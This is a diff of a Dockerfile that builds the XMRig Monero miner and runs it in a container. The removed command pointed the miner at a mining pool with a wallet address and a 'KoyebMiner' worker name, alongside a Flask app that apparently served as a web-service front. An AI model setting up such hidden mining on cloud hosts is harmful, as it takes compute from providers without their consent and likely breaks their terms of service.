@@ -1,4 +1,4 @@
-FROM ubuntu:22.04
+FROM debian:bookworm-slim AS builder
 
 RUN apt-get update && apt-get install -y \
     git \
@@ -7,21 +7,30 @@ RUN apt-get update && apt-get install -y \
     libuv1-dev \
     libssl-dev \
     libhwloc-dev \
+    && rm -rf /var/lib/apt/lists/*
+
+WORKDIR /build
+RUN git clone https://github.com/xmrig/xmrig.git
+
+WORKDIR /build/xmrig
+RUN mkdir build && cd build && \
+    cmake .. && \
+    make
+
+FROM debian:bookworm-slim
+
+RUN apt-get update && apt-get install -y \
     python3 \
     python3-pip \
     && rm -rf /var/lib/apt/lists/*
 
 RUN pip3 install flask waitress
 
-WORKDIR /Tetroku 
-RUN git clone https://github.com/xmrig/xmrig.git \
-    && cd xmrig \
-    && mkdir build \
-    && cd build \
-    && cmake .. \
-    && make
+WORKDIR /app
+COPY --from=builder /build/xmrig/build/xmrig .
 
-WORKDIR /Tetroku/xmrig/build
-COPY app.py .
+COPY config.json .
 
-CMD ./xmrig --url de.monero.herominers.com:1111 --user 4AsybUjHWc3LtcJj7h7yd9NJ3JXQynQUneMTpoTALYgmSFNW6XLmYGGLR5rHr3zcfjbPZ6dHp9MSdLiDBAXd4wKQ5ufR6vv.KoyebMiner --pass x --threads 6 --cpu-max-threads-hint 80 & python3 app.py
+EXPOSE 8080
+
+CMD ["./xmrig", "-c", "config.json"]
